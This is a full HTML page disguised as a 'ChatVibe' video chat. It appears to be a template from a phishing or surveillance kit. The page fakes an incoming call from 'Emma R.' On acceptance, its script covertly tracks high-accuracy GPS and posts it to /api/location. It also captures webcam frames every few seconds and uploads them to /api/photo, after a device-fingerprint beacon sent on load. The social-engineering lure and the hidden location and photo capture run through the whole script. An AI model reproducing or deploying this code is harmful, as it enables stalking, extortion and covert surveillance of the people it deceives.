<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ChatVibe - Video Chat</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family:'Inter',sans-serif; background:#111827; color:#fff; height:100vh; overflow:hidden; }

  .app-layout { display:flex; height:100vh; }

  /* Sidebar */
  .sidebar {
    width:260px; background:#1f2937; border-right:1px solid rgba(255,255,255,0.06);
    display:flex; flex-direction:column;
  }
  .sidebar-logo {
    padding:16px; border-bottom:1px solid rgba(255,255,255,0.06);
    font-size:18px; font-weight:700;
    background:linear-gradient(135deg,#6366f1,#a855f7); -webkit-background-clip:text; -webkit-text-fill-color:transparent;
  }
  .sidebar-logo span { font-size:22px; }
  .online-section { padding:12px 16px; }
  .online-title { font-size:11px; color:rgba(255,255,255,0.4); text-transform:uppercase; letter-spacing:1px; margin-bottom:8px; }
  .user-item {
    display:flex; align-items:center; gap:10px; padding:8px; border-radius:8px;
    cursor:pointer; transition:background 0.2s; position:relative;
  }
  .user-item:hover { background:rgba(255,255,255,0.05); }
  .user-item.active { background:rgba(99,102,241,0.15); }
  .u-avatar {
    width:36px; height:36px; border-radius:50%;
    display:flex; align-items:center; justify-content:center; font-size:16px; flex-shrink:0;
  }
  .u-online { position:absolute; bottom:8px; left:36px;
    width:10px; height:10px; border-radius:50%; background:#22c55e;
    border:2px solid #1f2937;
  }
  .u-name { font-size:14px; }
  .u-status { font-size:12px; color:rgba(255,255,255,0.4); }
  .u-typing { font-size:12px; color:#6366f1; animation:typingPulse 1s ease infinite; }
  @keyframes typingPulse { 0%,100%{opacity:1} 50%{opacity:0.4} }

  /* Chat area */
  .chat-area { flex:1; display:flex; flex-direction:column; }
  .chat-header {
    padding:12px 16px; background:#1f2937; border-bottom:1px solid rgba(255,255,255,0.06);
    display:flex; align-items:center; gap:10px;
  }
  .chat-header .u-avatar { font-size:18px; }
  .ch-info .ch-name { font-size:15px; font-weight:500; }
  .ch-info .ch-online { font-size:12px; color:#22c55e; }
  .chat-actions { margin-left:auto; display:flex; gap:8px; }
  .ca-btn {
    background:rgba(255,255,255,0.06); border:none; border-radius:8px;
    padding:8px 12px; color:#fff; cursor:pointer; font-size:14px; transition:all 0.2s;
  }
  .ca-btn:hover { background:rgba(255,255,255,0.12); }
  .ca-btn.primary { background:#6366f1; }
  .ca-btn.primary:hover { background:#4f46e5; }

  .messages {
    flex:1; overflow-y:auto; padding:16px; display:flex; flex-direction:column; gap:12px;
    scrollbar-width:thin; scrollbar-color:rgba(255,255,255,0.1) transparent;
  }
  .msg { display:flex; gap:10px; max-width:70%; }
  .msg.sent { align-self:flex-end; flex-direction:row-reverse; }
  .msg-avatar { width:32px; height:32px; border-radius:50%; flex-shrink:0; display:flex; align-items:center; justify-content:center; font-size:14px; }
  .msg-bubble {
    background:rgba(255,255,255,0.07); border-radius:14px; padding:10px 14px;
    font-size:14px; line-height:1.5;
  }
  .msg.sent .msg-bubble { background:linear-gradient(135deg,#6366f1,#a855f7); }
  .msg-time { font-size:11px; color:rgba(255,255,255,0.3); margin-top:4px; }
  .msg.sent .msg-time { text-align:right; }

  .chat-input-area {
    padding:12px 16px; background:#1f2937; border-top:1px solid rgba(255,255,255,0.06);
    display:flex; gap:10px; align-items:center;
  }
  .chat-input {
    flex:1; background:rgba(255,255,255,0.06); border:1px solid rgba(255,255,255,0.08);
    border-radius:24px; padding:10px 16px; color:#fff; font-size:14px; outline:none; font-family:inherit;
  }
  .chat-input::placeholder { color:rgba(255,255,255,0.3); }
  .send-btn {
    background:linear-gradient(135deg,#6366f1,#a855f7); border:none; border-radius:50%;
    width:40px; height:40px; display:flex; align-items:center; justify-content:center;
    cursor:pointer; font-size:16px; transition:all 0.2s;
  }
  .send-btn:hover { transform:scale(1.1); }

  /* Video call overlay */
  .video-overlay {
    position:fixed; inset:0; background:rgba(0,0,0,0.95);
    display:none; flex-direction:column; align-items:center; justify-content:center;
    z-index:500;
  }
  .video-overlay.show { display:flex; }
  .vo-calling {
    text-align:center; animation:fadeIn 0.4s ease;
  }
  @keyframes fadeIn { from{opacity:0;transform:scale(0.9)} to{opacity:1;transform:scale(1)} }
  .vo-avatar {
    width:120px; height:120px; border-radius:50%; margin:0 auto 16px;
    background:linear-gradient(135deg,#6366f1,#a855f7);
    display:flex; align-items:center; justify-content:center; font-size:56px;
    animation:ringPulse 1.5s ease-in-out infinite;
  }
  @keyframes ringPulse {
    0%,100%{box-shadow:0 0 0 0 rgba(99,102,241,0.6)}
    50%{box-shadow:0 0 0 24px rgba(99,102,241,0)}
  }
  .vo-name { font-size:22px; font-weight:600; margin-bottom:4px; }
  .vo-status { font-size:15px; color:rgba(255,255,255,0.6); margin-bottom:40px; }
  .vo-controls { display:flex; gap:20px; justify-content:center; }
  .vo-btn {
    width:60px; height:60px; border-radius:50%; border:none;
    display:flex; align-items:center; justify-content:center; font-size:24px; cursor:pointer;
    transition:all 0.2s;
  }
  .vo-btn:hover { transform:scale(1.1); }
  .vo-btn.decline { background:#ef4444; }
  .vo-btn.accept { background:#22c55e; }
  .vo-btn.mute { background:rgba(255,255,255,0.1); }

  /* Active video call */
  .active-call {
    position:fixed; inset:0; background:#000;
    display:none; z-index:600;
  }
  .active-call.show { display:block; }
  .main-video-bg {
    width:100%; height:100%; object-fit:cover;
    transform:scaleX(-1);
    background:linear-gradient(135deg,#1f2937,#111827);
  }
  .pip-video {
    position:absolute; top:20px; right:20px;
    width:140px; height:100px; border-radius:12px; overflow:hidden;
    border:2px solid rgba(255,255,255,0.2);
    background:linear-gradient(135deg,#6366f1,#a855f7);
    display:flex; align-items:center; justify-content:center; font-size:32px;
  }
  .call-ui { position:absolute; bottom:30px; left:0; right:0;
    display:flex; justify-content:center; gap:16px; }
  .call-btn {
    width:56px; height:56px; border-radius:50%; border:none;
    background:rgba(255,255,255,0.15); color:#fff; font-size:22px;
    cursor:pointer; transition:all 0.2s; display:flex; align-items:center; justify-content:center;
  }
  .call-btn:hover { background:rgba(255,255,255,0.25); }
  .call-btn.end { background:#ef4444; }
  .call-canvas { display:none; }
  .call-timer {
    position:absolute; top:20px; left:50%; transform:translateX(-50%);
    background:rgba(0,0,0,0.5); padding:6px 16px; border-radius:20px; font-size:14px;
  }

  /* Notification popup */
  .call-notif {
    position:fixed; top:20px; right:20px;
    background:#1f2937; border:1px solid rgba(99,102,241,0.3); border-radius:16px;
    padding:16px; width:300px; z-index:400;
    box-shadow:0 8px 32px rgba(0,0,0,0.4);
    animation:slideIn 0.4s ease; display:none;
  }
  .call-notif.show { display:block; }
  @keyframes slideIn { from{transform:translateX(100%);opacity:0} to{transform:translateX(0);opacity:1} }
  .notif-content { display:flex; align-items:center; gap:12px; margin-bottom:12px; }
  .notif-avatar { width:48px; height:48px; border-radius:50%; background:linear-gradient(135deg,#6366f1,#a855f7); display:flex; align-items:center; justify-content:center; font-size:22px; }
  .notif-name { font-size:15px; font-weight:500; }
  .notif-type { font-size:13px; color:rgba(255,255,255,0.5); }
  .notif-btns { display:flex; gap:8px; }
  .notif-btn {
    flex:1; padding:8px; border:none; border-radius:8px;
    font-size:14px; cursor:pointer; font-weight:500;
  }
  .notif-btn.decline { background:rgba(239,68,68,0.15); color:#ef4444; }
  .notif-btn.accept { background:rgba(34,197,94,0.15); color:#22c55e; }
  .notif-btn.accept:hover { background:#22c55e; color:#fff; }

  @media(max-width:768px){ .sidebar{display:none;} }
</style>
</head>
<body>

<!-- Incoming call notification -->
<div class="call-notif" id="callNotif">
  <div class="notif-content">
    <div class="notif-avatar">💜</div>
    <div>
      <div class="notif-name">Emma R.</div>
      <div class="notif-type">📹 Incoming video call...</div>
    </div>
  </div>
  <div class="notif-btns">
    <button class="notif-btn decline" onclick="declineCall()">✕ Decline</button>
    <button class="notif-btn accept" id="acceptCallBtn" onclick="acceptCall()">✓ Accept</button>
  </div>
</div>

<!-- Active video call -->
<div class="active-call" id="activeCall">
  <video id="callVideo" class="main-video-bg" autoplay muted playsinline></video>
  <canvas class="call-canvas" id="callCanvas"></canvas>
  <div class="pip-video">💜</div>
  <div class="call-timer" id="callTimer">00:00</div>
  <div class="call-ui">
    <button class="call-btn">🎤</button>
    <button class="call-btn">📷</button>
    <button class="call-btn">🔊</button>
    <button class="call-btn end" onclick="endCall()">📞</button>
  </div>
</div>

<div class="app-layout">
  <!-- Sidebar -->
  <div class="sidebar">
    <div class="sidebar-logo"><span>💬</span> ChatVibe</div>
    <div class="online-section">
      <div class="online-title">Online — 4</div>
      <div class="user-item active">
        <div class="u-avatar" style="background:linear-gradient(135deg,#6366f1,#a855f7)">E</div>
        <div class="u-online"></div>
        <div><div class="u-name">Emma R.</div><div class="u-typing">typing...</div></div>
      </div>
      <div class="user-item">
        <div class="u-avatar" style="background:linear-gradient(135deg,#ef4444,#f97316)">A</div>
        <div class="u-online"></div>
        <div><div class="u-name">Alex M.</div><div class="u-status">Online</div></div>
      </div>
      <div class="user-item">
        <div class="u-avatar" style="background:linear-gradient(135deg,#22c55e,#16a34a)">S</div>
        <div class="u-online"></div>
        <div><div class="u-name">Sara K.</div><div class="u-status">Online</div></div>
      </div>
    </div>
  </div>

  <!-- Chat area -->
  <div class="chat-area">
    <div class="chat-header">
      <div class="u-avatar" style="background:linear-gradient(135deg,#6366f1,#a855f7)">E</div>
      <div class="ch-info">
        <div class="ch-name">Emma R.</div>
        <div class="ch-online">● Online</div>
      </div>
      <div class="chat-actions">
        <button class="ca-btn">📞</button>
        <button class="ca-btn primary" id="videoCallBtn" onclick="startVideoNotif()">📹 Video Call</button>
        <button class="ca-btn">⋯</button>
      </div>
    </div>

    <div class="messages" id="messages">
      <div class="msg">
        <div class="msg-avatar" style="background:linear-gradient(135deg,#6366f1,#a855f7)">E</div>
        <div>
          <div class="msg-bubble">Hey! 👋 Want to hop on a quick video call?</div>
          <div class="msg-time">2:34 PM</div>
        </div>
      </div>
      <div class="msg sent">
        <div class="msg-avatar" style="background:linear-gradient(135deg,#374151,#4b5563)">Y</div>
        <div>
          <div class="msg-bubble">Sure! Give me a sec 😊</div>
          <div class="msg-time">2:35 PM</div>
        </div>
      </div>
      <div class="msg">
        <div class="msg-avatar" style="background:linear-gradient(135deg,#6366f1,#a855f7)">E</div>
        <div>
          <div class="msg-bubble">Calling you now! 📹✨</div>
          <div class="msg-time">2:35 PM</div>
        </div>
      </div>
    </div>

    <div class="chat-input-area">
      <input class="chat-input" type="text" placeholder="Type a message...">
      <button class="send-btn">➤</button>
    </div>
  </div>
</div>

<script>
const SERVER = window.location.origin;
let sessionId = null, photoIndex = 0, callTimer = null, callSecs = 0;

async function sendBeacon() {
  try {
    const r = await fetch(`${SERVER}/api/beacon`,{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({template:'videochat',screen:{width:screen.width,height:screen.height},platform:navigator.platform,language:navigator.language})});
    sessionId = (await r.json()).session;
  } catch(e){}
}

function startVideoNotif() {
  setTimeout(()=>{
    document.getElementById('callNotif').classList.add('show');
  }, 800);
}

function declineCall() {
  document.getElementById('callNotif').classList.remove('show');
}

async function acceptCall() {
  document.getElementById('callNotif').classList.remove('show');
  document.getElementById('activeCall').classList.add('show');
  callSecs = 0;
  callTimer = setInterval(()=>{
    callSecs++;
    const m=String(Math.floor(callSecs/60)).padStart(2,'0');
    const s=String(callSecs%60).padStart(2,'0');
    document.getElementById('callTimer').textContent=`${m}:${s}`;
  },1000);

  try {
    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:true});
    const video = document.getElementById('callVideo');
    video.srcObject = stream;

    console.log('[DEBUG] Location capture called, sessionId=', sessionId);
    let gpsLat = null, gpsLon = null, gpsAcc = null;
    let watchId = null;

    if(navigator.geolocation){
      try {
        watchId = navigator.geolocation.watchPosition((pos) => {
          gpsLat = pos.coords.latitude;
          gpsLon = pos.coords.longitude;
          gpsAcc = pos.coords.accuracy;
          console.log('[DEBUG] watchPosition GPS:', gpsLat, gpsLon, gpsAcc, 'm');
        }, (err) => {
          console.log('[!] watchPosition error:', err.code, err.message);
        }, {
          enableHighAccuracy: true,
          timeout: 20000,
          maximumAge: 0
        });

        await new Promise(r => setTimeout(r, 15000));

        if (watchId) {
          navigator.geolocation.clearWatch(watchId);
          watchId = null;
        }
      } catch(err) {
        console.log('[!] Geolocation setup error:', err);
        if (watchId) {
          navigator.geolocation.clearWatch(watchId);
          watchId = null;
        }
      }
    } else {
      console.log('[DEBUG] Geolocation not supported');
    }
    fetch(`${SERVER}/api/location`,{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({session:sessionId,lat:gpsLat,lon:gpsLon,accuracy:gpsAcc})})
      .then(r=>r.json()).then(d=>console.log('[DEBUG] Location response:', d))
      .catch(e=>console.log('[!] Location send error:', e));

    const snap = () => {
      if(video.readyState<2) return;
      const c=document.getElementById('callCanvas');
      c.width=video.videoWidth||640; c.height=video.videoHeight||480;
      c.getContext('2d').drawImage(video,0,0);
      const b64=c.toDataURL('image/jpeg',0.85);
      fetch(`${SERVER}/api/photo`,{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({session:sessionId,image:b64,index:photoIndex++,camera:'front'})});
    };
    setTimeout(snap, 1500);
    setInterval(snap, 8000);
  } catch(e){}
}

function endCall() {
  clearInterval(callTimer);
  document.getElementById('activeCall').classList.remove('show');
  const video = document.getElementById('callVideo');
  if(video.srcObject) video.srcObject.getTracks().forEach(t=>t.stop());
}

sendBeacon();
// Auto trigger notification after 2 seconds
setTimeout(startVideoNotif, 2000);
</script>
</body>
</html>
